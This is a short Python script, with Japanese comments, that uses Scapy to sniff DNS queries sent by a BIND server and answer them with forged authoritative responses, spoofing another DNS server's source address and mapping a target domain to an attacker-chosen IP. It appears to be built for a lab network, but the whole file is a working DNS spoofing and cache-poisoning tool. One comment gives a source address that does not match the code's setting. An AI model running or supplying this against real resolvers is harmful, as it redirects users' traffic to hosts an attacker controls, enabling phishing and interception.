from scapy.all import sniff, IP, UDP, DNS, DNSRR, send
import sys

# 各種設定
TARGET_BIND_IP = "192.168.1.11"   # BINDサーバーのIP
FAKE_DNS_IP = "192.168.2.12"      # なりすましたいDNSサーバーのIP
SPOOF_RESPONSE_IP = "1.2.3.4"     # 返したい嘘のIP
TARGET_DOMAIN = "host1.example1.test." # 末尾のドットが必要です

print("--- DNSリアルタイム自動迎撃スクリプトを起動しました ---")
print(f"監視対象: {TARGET_BIND_IP} からのクエリ...")

def handle_packet(pkt):
    # BINDから53000番ポート宛てに飛んできたUDPのDNSクエリを検知
    if pkt.haslayer(DNS) and pkt[DNS].opcode == 0 and pkt[IP].src == TARGET_BIND_IP:
        qname = pkt[DNS].qd.qname.decode('utf-8')
        
        # 探しているドメイン名と一致するかチェック
        if TARGET_DOMAIN in qname:
            txid = pkt[DNS].id
            dst_port = pkt[UDP].dport
            print(f"[検知] BINDからのクエリを確認! TXID: {hex(txid)}, 宛先ポート: {dst_port}")
            
            # 【重要】超高速で応答パケットをその場で組み立て
            # 送信元IPを 192.168.1.12、送信元ポートを 53 に完全偽装
            spoof_pkt = (
                IP(src=FAKE_DNS_IP, dst=TARGET_BIND_IP) /
                UDP(sport=53, dport=dst_port) /
                DNS(
                    id=txid,
                    qr=1,           # Responseフラグ
                    aa=1,           # Authoritative Answer
                    qd=pkt[DNS].qd, # 質問セクションをそのままオウム返し
                    an=DNSRR(rrname=qname, type='A', rclass='IN', ttl=60, rdata=SPOOF_RESPONSE_IP) # 回答
                )
            )
            
            # ネットワークに直接射出（ミリ秒レベルで届くためタイムアウトしません）
            send(spoof_pkt, verbose=False)
            print(f"[送信] 偽装応答 (53 -> {dst_port}) を BIND へ撃ち返しました。")

# eth0 インターフェースを流れるパケットを常時監視
# 修正前: sniff(iface="eth0", filter=f"udp and dst port 53000", prn=handle_packet, store=0)
# 修正後:
sniff(iface="eth0", filter="udp", prn=handle_packet, store=0)